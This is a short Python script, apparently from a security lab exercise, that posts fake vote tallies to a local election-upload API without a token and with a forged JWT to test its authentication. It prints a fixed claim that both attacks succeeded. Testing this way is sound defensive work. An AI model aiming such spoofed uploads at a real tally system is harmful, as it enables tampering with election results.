import requests
import uuid
from datetime import datetime, timezone

API_URL = "http://localhost:8000"

def attack_no_token():
    """Tenta upload sem nenhum token de autenticação"""
    payload = {
        "id": str(uuid.uuid4()),
        "station_id": "ZONA-FALSA-999",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "candidates": {"candidato_A": 9999, "candidato_B": 0, "candidato_C": 0},
        "hash": "hash_falso_sem_assinatura"
    }
    response = requests.post(f"{API_URL}/upload", json=payload)
    return response.json()

def attack_forged_token():
    """Tenta upload com token JWT forjado"""
    fake_token = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdGFjYW50ZSJ9.assinatura_falsa"
    payload = {
        "id": str(uuid.uuid4()),
        "station_id": "ZONA-FALSA-888",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "candidates": {"candidato_A": 8888, "candidato_B": 0, "candidato_C": 0},
        "hash": "hash_falso_token_forjado"
    }
    response = requests.post(f"{API_URL}/upload", json=payload, headers={"Authorization": fake_token})
    return response.json()

if __name__ == "__main__":
    print("=== ATAQUE SPOOFING - BASELINE (sem controles) ===\n")

    print("[1] Upload SEM token:")
    result = attack_no_token()
    print(f"    Resultado: {result}\n")

    print("[2] Upload com token FORJADO:")
    result = attack_forged_token()
    print(f"    Resultado: {result}\n")

    print(">>> BASELINE: ambos os ataques foram ACEITOS pela API (vulnerável)")
